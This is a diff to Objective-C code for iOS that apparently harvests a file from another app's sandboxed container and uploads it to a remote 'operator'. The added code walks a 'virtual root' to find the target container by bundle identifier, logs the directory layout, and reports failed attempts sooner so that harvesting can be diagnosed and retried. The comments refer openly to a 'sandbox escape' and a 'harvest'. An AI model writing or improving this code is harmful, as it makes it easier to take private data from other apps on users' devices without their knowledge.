@@ -75,6 +75,73 @@ static NSArray<NSString *> *TMPersistVirtualRootDirectoryNames(void)
     return @[@"[MHA-C2] App Data", @"App Data"];
 }
 
+/// Searches the virtual root instead of trusting the hard-coded directory names.
+///
+/// The virtual root lives at `<our Documents>/Device Storage` and maps other
+/// apps' containers by *identifier* rather than by UUID, so a container is
+/// normally reached as `<root>/<some grouping folder>/<identifier>`. The grouping
+/// folder's name is a guess in this tree and differs per install, so the search
+/// walks the root (depth 3) and accepts a directory whose name matches the
+/// identifier - or any directory that directly contains the requested relative
+/// path. Whatever it walks is recorded in `virtualRootTree`, so a miss shows the
+/// real layout instead of hiding it.
+static NSString *TMPersistSearchVirtualRoot(NSString *virtualRoot, NSString *bundleID,
+                                           NSString *relativePath,
+                                           NSMutableDictionary *result)
+{
+    NSFileManager *manager = NSFileManager.defaultManager;
+    if (virtualRoot.length == 0 || ![manager fileExistsAtPath:virtualRoot]) return nil;
+
+    NSMutableArray<NSString *> *tree = [NSMutableArray array];
+    NSString *identifierMatch = nil;
+    NSString *storeMatch = nil;
+
+    NSMutableArray<NSArray<NSString *> *> *queue =
+        [NSMutableArray arrayWithObject:@[virtualRoot, @""]];
+    while (queue.count > 0) {
+        NSArray<NSString *> *entry = queue.firstObject;
+        [queue removeObjectAtIndex:0];
+        NSString *path = entry[0];
+        NSString *relative = entry[1];
+        NSUInteger depth = relative.length > 0 ? [relative componentsSeparatedByString:@"/"].count : 0;
+        if (depth > 3) continue;
+
+        NSArray<NSString *> *children = [manager contentsOfDirectoryAtPath:path error:nil];
+        for (NSString *name in children) {
+            NSString *child = [path stringByAppendingPathComponent:name];
+            NSString *relativeChild = relative.length > 0
+                ? [relative stringByAppendingPathComponent:name] : name;
+            BOOL isDirectory = NO;
+            if (![manager fileExistsAtPath:child isDirectory:&isDirectory] || !isDirectory) continue;
+            if (tree.count < 80) [tree addObject:relativeChild];
+
+            // A directory that already holds the store is the container itself.
+            if (!storeMatch &&
+                [manager fileExistsAtPath:[child stringByAppendingPathComponent:relativePath]])
+                storeMatch = child.stringByResolvingSymlinksInPath;
+
+            if (!identifierMatch &&
+                ([name caseInsensitiveCompare:bundleID] == NSOrderedSame ||
+                 [name rangeOfString:bundleID options:NSCaseInsensitiveSearch].location != NSNotFound))
+                identifierMatch = child.stringByResolvingSymlinksInPath;
+
+            [queue addObject:@[child, relativeChild]];
+        }
+    }
+
+    result[@"virtualRoot"] = virtualRoot;
+    result[@"virtualRootTree"] = tree;
+    if (storeMatch) {
+        result[@"resolution"] = @"virtual-root-store";
+        return storeMatch;
+    }
+    if (identifierMatch) {
+        result[@"resolution"] = @"virtual-root-identifier";
+        return identifierMatch;
+    }
+    return nil;
+}
+
 #pragma mark - State
 
 static NSDictionary<NSString *, id> *gTMPersistSnapshot = nil;
@@ -196,7 +263,8 @@ static BOOL TMPersistPathIsDirectory(NSString *path)
 
 static NSString *TMPersistContainerRootForBundleID(NSString *bundleID,
                                                    NSString **error,
-                                                   NSString **method)
+                                                   NSString **method,
+                                                   NSMutableDictionary *result)
 {
     NSFileManager *manager = NSFileManager.defaultManager;
 
@@ -239,6 +307,15 @@ static NSString *TMPersistContainerRootForBundleID(NSString *bundleID,
             *method = [NSString stringWithFormat:@"virtual-root(%@)", directoryName];
             return candidate.stringByResolvingSymlinksInPath;
         }
+    }
+
+    // 2b. Same root, but searched by content: the grouping directory's name is a
+    //     guess above and differs per install.
+    NSString *searched = TMPersistSearchVirtualRoot(virtualRoot, bundleID, relativePath, result);
+    if (searched.length > 0) {
+        *method = [NSString stringWithFormat:@"virtual-root-search(%@)",
+                   result[@"resolution"] ?: @"hit"];
+        return searched;
     }
 
     // 3. Direct metadata scan: needs no bridge, only the sandbox escape.
@@ -379,6 +456,13 @@ static NSData *TMPersistMultipartBody(NSArray<NSDictionary *> *parts, NSString *
 static void TMPersistStoreUploadStatus(NSDictionary *status)
 {
     @synchronized (TMPersistLock()) { gTMPersistUpload = status; }
+}
+
+static NSDictionary *TMPersistWithAttempt(NSDictionary *result, NSUInteger attempt)
+{
+    NSMutableDictionary *annotated = [result mutableCopy];
+    annotated[@"attempt"] = @(attempt);
+    return annotated;
 }
 
 /// Reports what the harvest did, success or failure, through the same
@@ -771,8 +855,9 @@ static NSDictionary *TMPersistPerformHarvest(void)
     // reusing an NSString* for an NSError** argument stays silent until the
     // first property access on it.
     NSString *discoveryFailure = nil;
-    NSString *container = TMPersistContainerRootForBundleID(bundleID, &discoveryFailure, &method);
     NSMutableDictionary *resolution = [NSMutableDictionary dictionary];
+    NSString *container = TMPersistContainerRootForBundleID(bundleID, &discoveryFailure, &method,
+                                                            resolution);
 
     NSString *containerUUID = @"";
     NSString *target = nil;
@@ -916,18 +1001,22 @@ void TryMaskCardPersistHarvest(BOOL force)
                 NSData *content = path.length > 0 ? [NSData dataWithContentsOfFile:path] : nil;
                 @synchronized (TMPersistLock()) { gTMPersistContent = content; }
                 TMPersistUploadIfConfigured(result, content ?: [NSData data]);
-                TMPersistReportOutcome(result);
+                TMPersistReportOutcome(TMPersistWithAttempt(result, attempts));
                 return;
             }
 
-            // Report the failure once so the operator sees why nothing arrived,
-            // then keep retrying while the device brings the container bridge up.
+            // Report the first failure as well as the last one. Waiting for the
+            // sixth attempt meant the operator saw nothing at all if the app was
+            // closed before the retry schedule finished, which is exactly the
+            // state that has to be diagnosable. The outcome fingerprint keeps the
+            // retries from repeating it.
+            TMPersistReportOutcome(TMPersistWithAttempt(result, attempts));
+
             if (attempts < 6) {
                 dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)),
                                queue, ^{ TryMaskCardPersistHarvest(NO); });
             } else {
                 TMPersistLog(@"giving up after %lu attempts", (unsigned long)attempts);
-                TMPersistReportOutcome(result);
             }
         }
     });
